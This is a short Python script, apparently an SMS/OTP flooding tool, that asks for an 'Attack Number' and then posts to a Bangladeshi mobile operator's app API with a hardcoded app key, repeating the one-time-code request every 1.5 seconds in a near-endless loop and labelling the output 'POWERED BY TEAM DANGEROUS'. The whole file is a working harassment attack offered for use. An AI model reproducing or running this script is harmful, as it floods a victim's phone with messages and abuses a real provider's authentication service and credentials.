import os
os.system('clear')
# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
# Bold High Intensty


# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White
import requests, time
import requests, time
	
# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White

import requests
from requests.structures import CaseInsensitiveDict
print("\n")
number=str(input(bicyan+"[>] Enter Your Attack Number: "))
print(" \n")
url = "https://circle.robi.com.bd/mylife/appapi/appcall.php"

headers = CaseInsensitiveDict()
headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
headers["User-Agent"] = "gzip"
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "op=getOTC&pin=21799&app_version=78&msisdn=88"+number

for i in range(999999999999999999999999):
    try:     
        x = requests.post(url, headers=headers, data=data)



        time.sleep(1.5)
        print(" \n"+biblue+str([i+1])+bired+"\t[×] You have send too much request"+bigreen+"\nAttacked Number\t"+bicyan+number+bigreen+" \t POWERED BY TEAM DANGEROUS")   
    except:
        print(bicyan+"\n[~] Make Sure Your Internet Connection")           
os.system('clear')